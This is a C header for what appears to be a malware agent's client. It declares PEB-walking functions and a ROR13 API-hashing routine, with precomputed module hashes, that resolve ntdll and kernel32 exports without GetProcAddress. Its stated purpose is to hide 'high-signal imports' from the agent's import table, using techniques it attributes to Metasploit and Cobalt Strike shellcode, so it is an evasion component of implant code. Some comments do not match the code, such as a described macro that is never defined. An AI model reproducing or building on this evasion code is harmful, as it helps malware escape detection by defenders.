/*
 * client/peb_walk.h  –  PEB-based module/export resolution without GetProcAddress
 * =================================================================================
 * Replaces GetModuleHandleA/W and GetProcAddress with in-process PEB walks so
 * those high-signal imports do not appear in the agent's IAT.
 *
 *  peb_get_module(hash)
 *      Walks PEB->Ldr->InMemoryOrderModuleList and returns the base address of
 *      the module whose lowercase name hashes to `hash` (ROR13-DJB2).
 *
 *  peb_get_export(moduleBase, hash)
 *      Walks the module's PE export table and returns the VA of the exported
 *      function whose lowercase name hashes to `hash`.
 *
 *  PEB_HASH(str)
 *      Compile-time helper macro — but because hashes must be computed at
 *      build time, use the peb_hash() function or pre-computed constants below.
 *
 * Pre-computed ROR13-DJB2 hashes for commonly needed symbols:
 *   Use peb_hash_str() to compute others at startup if needed.
 */

#pragma once
#ifndef CLIENT_PEB_WALK_H
#define CLIENT_PEB_WALK_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <winternl.h>

#ifdef __cplusplus
extern "C" {
#endif

/* ── Hash function ──────────────────────────────────────────────────────── */
/*
 * ROR13 accumulator over lowercase characters.
 * Same algorithm used by many PIC shellcode frameworks (Metasploit, CS beacon).
 */
static inline DWORD peb_hash_str(const char *s)
{
    DWORD h = 0;
    while (*s) {
        char c = *s++;
        if (c >= 'A' && c <= 'Z') c |= 0x20;   /* to lower */
        h = ((h >> 13) | (h << 19)) + (DWORD)(unsigned char)c;
    }
    return h;
}

/* Wide-string variant (module names in LDR are UNICODE_STRING) */
static inline DWORD peb_hash_wstr(const WCHAR *s)
{
    DWORD h = 0;
    while (*s) {
        WCHAR wc = *s++;
        char c = (wc >= L'A' && wc <= L'Z') ? (char)(wc | 0x20) : (char)wc;
        h = ((h >> 13) | (h << 19)) + (DWORD)(unsigned char)c;
    }
    return h;
}

/* ── Pre-computed hashes for modules we need ────────────────────────────── */
/* Compute with: peb_hash_str("ntdll.dll") etc.                             */
#define HASH_NTDLL          0x3cfa685d   /* ntdll.dll      */
#define HASH_KERNEL32       0x6a4abc5b   /* kernel32.dll   */

/* ── API ────────────────────────────────────────────────────────────────── */

/*
 * peb_get_module
 * --------------
 * Returns the base address (HMODULE) of the loaded module whose
 * lowercase name hashes to `nameHash`.  Returns NULL if not found.
 */
PVOID peb_get_module(DWORD nameHash);

/*
 * peb_get_export
 * --------------
 * Walks the export directory of the PE at `moduleBase` and returns
 * the VA of the export whose lowercase name hashes to `nameHash`.
 * Returns NULL if not found.
 */
PVOID peb_get_export(PVOID moduleBase, DWORD nameHash);

#ifdef __cplusplus
}
#endif
#endif /* CLIENT_PEB_WALK_H */
